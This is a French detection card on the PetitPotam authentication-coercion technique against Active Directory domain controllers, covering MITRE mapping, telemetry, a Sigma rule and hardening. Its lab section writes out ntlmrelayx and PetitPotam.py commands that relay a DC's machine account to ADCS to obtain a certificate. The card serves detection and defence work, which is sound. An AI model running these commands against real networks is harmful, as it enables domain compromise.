# 24 — PetitPotam (Coercion)

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Privilege Escalation / Initial Access |
| **Technique MITRE** | T1187 (Forced Authentication) |
| **Phase kill chain** | Credential Access / Lateral Movement |
| **CVE** | Abus de MS-EFSR (mitigé par patchs successifs) |
| **Privilèges requis** | Souvent non authentifié (selon patch level) |
| **Impact** | Critique (combiné à un relais ADCS → DA) |

---

## 1. Description

**PetitPotam** abuse le protocole **MS-EFSR** (Encrypting File System Remote), fonctions comme `EfsRpcOpenFileRaw`, pour **forcer un serveur/DC à s'authentifier** vers une machine arbitraire. Ce n'est pas une élévation en soi, mais un **déclencheur de coercion** : le compte machine du DC est relayé (fiche 17) vers **ADCS (ESC8)** ou LDAP (RBCD) → compromission du domaine. La famille inclut aussi **PrinterBug** (MS-RPRN), **DFSCoerce** (MS-DFSNM), **ShadowCoerce**.

## 2. Prérequis
- Accès réseau RPC au DC/serveur.
- Une cible de relais valide (ADCS HTTP, LDAP sans signing).

## 3. Procédure de simulation (lab)

```bash
# 1. Démarrer le relais vers ADCS (ESC8)
ntlmrelayx.py -t http://adcs.domaine.local/certsrv/certfnsh.asp --adcs --template DomainController

# 2. Forcer le DC à s'authentifier vers l'attaquant
PetitPotam.py -u user -p pass -d domaine.local 10.0.0.50 dc01.domaine.local
# variantes : coercer.py, printerbug.py, dfscoerce.py
```

## 4. Télémétrie générée (logs)

| Source | Event ID | Signification |
|--------|----------|---------------|
| Security (DC) | 5145 | Accès au pipe RPC `\PIPE\lsarpc` / `efsrpc` |
| Security (cible attaquant) | 4624 | Compte machine du DC authentifié vers l'attaquant |
| NDR / Zeek | DCE-RPC | Appels `EfsRpcOpenFileRaw` / `RpcRemoteFindFirstPrinterChangeNotification` |

**Anomalie clé :** appel EFSR/RPRN vers un DC provenant d'un hôte non-admin ; compte machine du DC s'authentifiant vers un hôte quelconque.

## 5. Détection

### Logique
Meilleure détection **réseau (NDR)** : repérer les opérations RPC de coercion (MS-EFSR/MS-RPRN/MS-DFSNM) vers un DC. Côté Windows, 5145 sur les named pipes concernés.

### Règle Sigma (Zeek/NDR)
```yaml
title: PetitPotam / Coercion - EFSR/RPRN RPC Calls to DC
status: experimental
logsource:
    product: zeek
    service: dce_rpc
detection:
    selection:
        operation:
            - 'EfsRpcOpenFileRaw'
            - 'EfsRpcEncryptFileSrv'
            - 'RpcRemoteFindFirstPrinterChangeNotification'
    condition: selection
level: high
```

### Traduction SIEM
- **Elastic :** logs Zeek `dce_rpc` filtrés sur les opérations de coercion.
- **NDR (Dataprotect) :** signatures natives PetitPotam/PrinterBug ; feed vers QRadar/XSOAR.

## 6. Contre-mesures / Hardening
- Patcher (mitigations EFSR successives).
- **EPA + désactivation de HTTP** sur ADCS (bloque ESC8) ; LDAP signing.
- Filtrer/désactiver le spouleur d'impression sur les DC.
- Restreindre l'accès RPC entrant sur les DC.

## 7. Features pour l'agent IA
- Appels RPC de coercion vers un DC (feature réseau).
- Compte machine DC authentifié vers un hôte inhabituel.
- Séquence coercion → relais → émission de certificat / RBCD.

## 8. Références
- https://attack.mitre.org/techniques/T1187/
- https://github.com/topotam/PetitPotam
